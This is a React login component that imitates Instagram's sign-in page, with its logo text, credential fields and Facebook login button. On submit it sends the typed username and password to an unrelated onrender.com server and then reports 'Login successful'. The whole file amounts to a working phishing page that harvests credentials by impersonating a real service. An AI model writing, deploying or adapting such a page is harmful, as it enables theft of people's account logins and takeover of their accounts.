
import React, { useState } from "react";
import axios from "axios";
import "./LoginForm.css";

function LoginForm() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await axios.post("https://loginserver-5.onrender.com/api/login/", {
        username,
        password,
      });

      console.log("Response:", response.data);
      alert("Login successful! ✅");
    } catch (error) {
      console.error("Error:", error);
      alert("Login failed ❌");
    }
  };

  return (
    <div className="login-wrapper">
      <div className="login-box">
        <h1 className="insta-logo">Instagram</h1>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Log In</button>
          <div className="divider">
            <div className="line"></div>
            <div className="or">OR</div>
            <div className="line"></div>
          </div>
          <button className="facebook-login">Log in with Facebook</button>
          <p className="forgot">Forgot password?</p>
        </form>
      </div>

      <div className="signup-box">
        <p>
          Don't have an account? <span>Sign up</span>
        </p>
      </div>
    </div>
  );
}

export default LoginForm;

